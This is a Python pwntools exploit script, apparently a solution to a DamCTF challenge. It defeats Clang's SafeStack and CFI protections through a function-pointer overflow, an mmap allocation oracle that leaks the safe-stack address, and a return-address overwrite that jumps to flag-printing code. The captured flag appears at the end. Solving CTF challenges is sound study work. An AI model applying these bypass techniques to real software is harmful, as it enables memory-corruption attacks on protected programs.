"""
Binary compiled with -fsanitize=safe-stack -fsanitize=cfi, but no other memory protections (besides
DEP). Use buffer overflow in safestack to overwrite function pointer, which will let us call certain
allowed functions in the binary. Use mmap as allocation oracle to leak location of the safe stack,
use arbitrary write to adjust return pointer to point to some existing code that prints a flag (the
return is not subject to CFI checks)

https://www.blackhat.com/docs/eu-16/materials/eu-16-Goktas-Bypassing-Clangs-SafeStack.pdf
"""

from pwn import *

binary_path = "./protected-feedback"
lib_path = "/lib/x86_64-linux-gnu/"

elf = context.binary = ELF(binary_path)
libc = ELF(lib_path + "libc.so.6")

gs="""
python
import splitmind
(splitmind.Mind()
    .tell_splitter(show_titles=True)
    .tell_splitter(set_title="gdb")
     #.above(of="main", display="expressions", size="75%")
     #.left(of="expressions", display="disasm", size="35%")
    .above(of="main", display="stack", size="75%")
    .left(of="stack", display="regs", size="66%")
    .right(of="regs", display="disasm")
).build(nobanner=True)
end

continue
"""
def start():
    if args.DEBUG:
        context.log_level = "DEBUG"

    if args.REMOTE:
        # nc chals.damctf.xyz 31781
        return remote("chals.damctf.xyz", 31781)

    if args.GDB:
        context.terminal = ["tmux", "split-window", "-v", "-b", "-p", "80"]
        return gdb.debug(binary_path, gdbscript=gs, env={"LD_LIBRARY_PATH": lib_path})
    else:
        return process([binary_path], env={"LD_LIBRARY_PATH": lib_path})


def breakpoint(io, msg=None):
    if args.GDB:
        if msg is not None:
            print(f"*** BREAKPOINT: {msg} ***")
        else:
            print("*** BREAKPOINT ***")
        io.interactive()


def call_function(io, addr, arg1=None, arg2=None):
    """Overwrite function pointer to call any CFI allowed function"""
    io.sendline(flat({
        0x00: b"3 ",
        0x12: p32(addr),
    }))
    io.readline()
    if arg1 is not None:
        io.sendline(f"{arg1}")
    else:
        io.sendline()
    io.readline()
    if arg2 is not None:
        io.sendline(f"{arg2}")
    else:
        io.sendline()


def read128(io, addr):
    call_function(io, elf.sym.print_rating, addr)
    io.readuntil("Rating: ")

    quads = io.readline().split(b"/")
    return int(quads[0]), int(quads[1])


def read64(io, addr):
    return read128(io, addr)[0]


def map_region(io, addr, length):
    call_function(io, elf.sym.map_region, addr, length)
    io.readuntil("Mapped rating @ ")

    mapped_addr = int(io.readline(), 16)
    return mapped_addr

io = start()

io.readuntil("Quit"); io.readline()

# Attempt to map page over loaded executable. This will fail, page will be mapped below loaded
# libraries instead. Use this to leak address
addr1 = map_region(io, 0x400000, 0x2000)
print(f"PAGE1 {hex(addr1)}")

# Attempt to allocate another page after the loaded libraries. Bail if it doesn't end up where we
# expect
PAGE_OFFSET = 0xb7f000
if args.GDB:
    PAGE_OFFSET = 0xb84000

target_addr = addr1 + PAGE_OFFSET
addr2 = map_region(io, target_addr, 0x2000)

print(f"TARGET {hex(target_addr)}")
print(f"PAGE2 {hex(addr2)}")

if addr2 != target_addr:
    print("ADDR != TARGET")
    exit()

# The next mapped area of memory is the safe stack, what we're trying to find. We'll locate this by
# filling the whole in the memory with mmap allocations, until we can't fit anymore. The stack
# region will be at the end of that region. Use a binary search of sorts to make this efficient

curr_addr = addr2 + 0x2000
curr_size = 0x10000000000

stack_addr = 0
while True:
    addr = map_region(io, curr_addr, curr_size)
    print(f"TARGET {hex(curr_addr)}")
    print(f"REGION {hex(addr)} {hex(curr_size)}")

    # If the allocated page and doesn't end up where we expected it to, that means the it couldn't
    # fit in the remaining empty space, so was placed somewhere else. Decrease the mmap size and try
    # again
    if addr != curr_addr:
        print("TOO BIG")

        # Once we can't fit another page in, we know we've reached the end
        if curr_size <= 0x1000:
            # Stack is still 0x100000 bytes away, not sure why mmap won't let us get right up to the
            # edge
            stack_addr = curr_addr + 0x100000
            break
        curr_size = curr_size // 2
    else:
        curr_addr += curr_size

print(f"STACK {hex(stack_addr)}")

menu_ret_addr = 0

# Stack contents are still a little randomized, cheesily search through the stack to find the return
# address we want to overwrite
# Need to be a little bit lucky here and hope we have enough time to leak the address before we get
# timed out remotely. Locally this is fine
# I'm curious what the intended solve is here, searching through the stack is pretty unreliable w/
# the timeout
for off in range(0x1fff0, 0x10000, -0x10):
    print(f"OFFSET {hex(off)}")
    x, y = read128(io, stack_addr + off)
    if x == 0x402f44:
        menu_ret_addr = stack_addr + off
        break
    elif y == 0x402f44:
        menu_ret_addr = stack_addr + off + 8
        break

# Binary gives 2 byte arbitrary write, use that to overwrite the return address with one that points
# into the middle of an unused function that prints the flag. Only function calls are subject to
# CFI, so this is fine
GET_FLAG_ADDR = 0x2ede

print(f"MENU RET ADDR {hex(menu_ret_addr)} {hex(menu_ret_addr - stack_addr)}")

io.clean()

io.sendline("2")
io.sendline()
io.sendline()

io.sendline(f"{menu_ret_addr}")
io.sendline(f"{GET_FLAG_ADDR}")

io.interactive()

# dam{l1k3_ST3aLiNg_4_5tAcK_4DDr_fr0M_4_b4BY}
